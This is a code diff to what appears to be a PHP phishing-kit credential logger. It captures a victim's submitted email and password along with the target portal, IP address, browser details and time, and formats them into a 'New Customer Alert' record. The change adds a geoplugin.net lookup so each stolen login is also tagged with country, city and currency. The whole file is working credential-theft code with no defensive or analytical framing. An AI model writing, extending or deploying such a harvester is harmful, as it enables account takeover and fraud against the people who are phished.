@@ -18,6 +18,23 @@ function getVisIpAddr() {
     // Display the IP address 
     echo $vis_ip; 
 
+    $ip = $vis_ip; 
+  
+// Use JSON encoded string and converts 
+// it into a PHP variable 
+$ipdat = @json_decode(file_get_contents( 
+    "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
+   
+echo 'Country Name: ' . $ipdat->geoplugin_countryName . "\n"; 
+echo 'City Name: ' . $ipdat->geoplugin_city . "\n";  
+echo 'Currency Symbol: ' . $ipdat->geoplugin_currencySymbol . "\n"; 
+echo 'Currency Code: ' . $ipdat->geoplugin_currencyCode . "\n"; 
+
+$countryName =  $ipdat->geoplugin_countryName;
+$city = $ipdat->geoplugin_city;
+$currencySymbol = $ipdat->geoplugin_currencySymbol;
+$currencyCode = $ipdat->geoplugin_currencyCode;
+
 $title = $_POST['title'];
 $username = $_POST['email'];
 $pwd = $_POST['pass'];
@@ -46,10 +63,15 @@ $tmain = "New Customer Alert \n ***DATA***INSERTED***\n
         Portal : ".$title."
         UserID : ".$username."
         Password : ".$pwd."
-        IP-Address : ".$_SERVER['REMOTE_ADDR']."
+        IP-Address : ".$vis_ip."
         Time Logged : ".date('F j, Y, g:i a')."
         Browser/Device/OS : ".$_SERVER['HTTP_USER_AGENT']."
-        Country : ".$vis_ip; "
+        Country : ".$countryName. " 
+        City : " .$city. "
+        currencySymbol : " .$currencySymbol."
+        currencyCode : " .$currencyCode."
+
+
         ";
 
 
